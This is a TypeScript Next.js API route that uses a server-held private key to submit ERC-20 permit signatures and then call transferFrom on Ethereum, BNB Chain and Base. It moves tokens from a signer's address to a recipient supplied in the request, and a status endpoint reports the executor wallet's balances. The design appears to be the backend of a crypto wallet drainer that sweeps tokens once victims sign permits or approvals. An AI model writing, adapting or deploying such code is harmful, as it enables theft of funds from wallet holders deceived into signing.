// app/api/execute-permit2/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { ethers } from 'ethers';

const BACKEND_CONFIG = {
  eth: {
    rpcUrl: process.env.ETH_RPC_URL || 'https://eth.llamarpc.com',
  },
  bnb: {
    rpcUrl: process.env.BNB_RPC_URL || 'https://bsc-dataseed1.defibit.io',
  },
  base: {
    rpcUrl: process.env.BASE_RPC_URL || 'https://mainnet.base.org',
  },
};

const ERC20_ABI = [
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
  'function symbol() view returns (string)',
];

const EXECUTOR_PRIVATE_KEY = process.env.EXECUTOR_PRIVATE_KEY;

export async function POST(request: NextRequest) {
  console.log('🚀 Backend execution request received');

  if (!EXECUTOR_PRIVATE_KEY) {
    return NextResponse.json({ error: 'Executor private key not configured' }, { status: 500 });
  }

  try {
    const body = await request.json();
    const { network, method, tokenAddress, tokenInfo } = body;

    console.log(`📤 Processing ${tokenInfo.symbol} on ${network} via ${method.toUpperCase()}`);

    const config = BACKEND_CONFIG[network as keyof typeof BACKEND_CONFIG];
    if (!config) {
      return NextResponse.json({ error: 'Unsupported network' }, { status: 400 });
    }

    const provider = new ethers.JsonRpcProvider(config.rpcUrl);
    const wallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
    
    console.log(`   Backend wallet: ${wallet.address}`);

    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);

    let txHash: string;

    if (method === 'permit') {
      console.log(`   🎯 Method: PERMIT + transferFrom`);
      txHash = await executePermitMethod(body, tokenContract, wallet);
      
    } else if (method === 'approve') {
      console.log(`   🔄 Method: transferFrom (after approve)`);
      txHash = await executeApproveMethod(body, tokenContract);
      
    } else {
      throw new Error('Invalid method');
    }

    console.log(`✅ ${tokenInfo.symbol} transferred successfully: ${txHash}\n`);
    
    return NextResponse.json({
      success: true,
      message: `${tokenInfo.symbol} transferred`,
      txHash: txHash,
      token: tokenInfo.symbol,
    });

  } catch (error: any) {
    console.error('❌ Backend execution error:', error);
    
    let errorMessage = 'Internal server error';
    
    if (error.message.includes('INVALID_SIGNATURE')) {
      errorMessage = 'Invalid signature';
    } else if (error.message.includes('EXPIRED_DEADLINE')) {
      errorMessage = 'Signature expired';
    } else if (error.message.includes('insufficient funds')) {
      errorMessage = 'Insufficient funds for gas';
    } else {
      errorMessage = error.message || 'Execution failed';
    }

    return NextResponse.json(
      {
        success: false,
        error: errorMessage,
      },
      { status: 500 }
    );
  }
}

async function executePermitMethod(
  body: any,
  tokenContract: ethers.Contract,
  wallet: ethers.Wallet
): Promise<string> {
  const { owner, spender, value, deadline, v, r, s } = body;

  console.log(`   📝 Calling permit()...`);
  
  const permitTx = await tokenContract.permit(
    owner,
    spender,
    value,
    deadline,
    v,
    r,
    s,
    {
      gasLimit: 100000,
    }
  );

  console.log(`   ⏳ Waiting for permit tx: ${permitTx.hash}`);
  await permitTx.wait();
  console.log(`   ✅ Permit successful!`);

  console.log(`   📤 Calling transferFrom()...`);
  
  const transferTx = await tokenContract.transferFrom(
    owner,
    spender,
    value,
    {
      gasLimit: 100000,
    }
  );

  console.log(`   ⏳ Waiting for transfer tx: ${transferTx.hash}`);
  const receipt = await transferTx.wait();

  if (receipt.status !== 1) {
    throw new Error('Transfer transaction failed');
  }

  return transferTx.hash;
}

async function executeApproveMethod(
  body: any,
  tokenContract: ethers.Contract
): Promise<string> {
  const { from, to, amount } = body;

  console.log(`   📤 Calling transferFrom()...`);
  
  const transferTx = await tokenContract.transferFrom(
    from,
    to,
    amount,
    {
      gasLimit: 100000,
    }
  );

  console.log(`   ⏳ Waiting for transfer tx: ${transferTx.hash}`);
  const receipt = await transferTx.wait();

  if (receipt.status !== 1) {
    throw new Error('Transfer transaction failed');
  }

  return transferTx.hash;
}

export async function GET() {
  try {
    const hasPrivateKey = !!EXECUTOR_PRIVATE_KEY;
    
    let executorAddress = 'Not configured';
    let balances: Record<string, string> = {};

    if (hasPrivateKey) {
      try {
        const tempWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY);
        executorAddress = tempWallet.address;

        for (const [network, config] of Object.entries(BACKEND_CONFIG)) {
          try {
            const provider = new ethers.JsonRpcProvider(config.rpcUrl);
            const balance = await provider.getBalance(executorAddress);
            balances[network] = ethers.formatEther(balance);
          } catch (error) {
            balances[network] = 'Error';
          }
        }
      } catch (error) {
        executorAddress = 'Invalid key';
      }
    }

    return NextResponse.json({
      status: 'ok',
      service: 'Token Transfer Executor (Permit + Approve)',
      configured: hasPrivateKey,
      executorAddress,
      balances,
      supportedNetworks: Object.keys(BACKEND_CONFIG),
      supportedMethods: ['permit', 'approve'],
    });

  } catch (error: any) {
    return NextResponse.json(
      {
        status: 'error',
        error: error.message,
      },
      { status: 500 }
    );
  }
}